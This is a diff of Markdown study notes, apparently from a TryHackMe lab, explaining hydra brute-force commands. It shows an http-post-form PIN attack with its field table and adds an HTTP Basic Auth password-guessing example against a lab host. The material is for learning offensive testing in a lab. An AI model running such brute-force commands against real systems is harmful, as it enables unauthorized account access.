@@ -69,9 +69,7 @@ hydra -l '' -P 3digits.txt -f -v 10.10.180.149 http-post-form "/login.php:pin=^P
 | `password`       | It's the form **field** where the password is entered                                    |
 | `^PASS^`         | The provided passwords will be **replacing**                                             |
 | `F=incorrect`    | **String** that appears in the server reply when the **login fails**                     |
-
-
-
-
----
-
+# HTTP GET Basic Auth Brute Force Example
+```shell
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt http-get://enum.thm/labs/basic_auth/ -V
+```
